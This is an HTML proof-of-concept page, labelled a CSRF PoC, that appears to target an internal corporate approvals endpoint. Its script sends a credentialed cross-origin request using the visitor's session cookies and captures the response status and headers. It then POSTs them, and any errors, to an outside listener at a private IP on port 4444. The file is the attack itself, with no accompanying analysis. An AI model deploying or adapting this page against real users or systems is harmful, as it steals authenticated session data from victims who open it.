<html>
<body>
<h1>CSRF PoC</h1>
<script>
fetch('https://internal.horizonnut.com/RTT/RttApprovals', {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
})
.then(response => {
    // Capture response details
    let responseData = {
        status: response.status,
        headers: {}
    };
    for (let [key, value] of response.headers) {
        responseData.headers[key] = value;
    }
    
    fetch('http://192.168.109.255:4444', {
        method: 'POST',
        body: JSON.stringify(responseData),
        mode: 'no-cors' 
    });
    
    return response.text();
})
.then(data => {
    console.log('Response received');
})
.catch(error => {
    console.error('Error:', error);
    fetch('http://192.168.109.255:4444', {
        method: 'POST',
        body: JSON.stringify({error: error.toString()}),
        mode: 'no-cors'
    });
});
</script>
</body>
</html>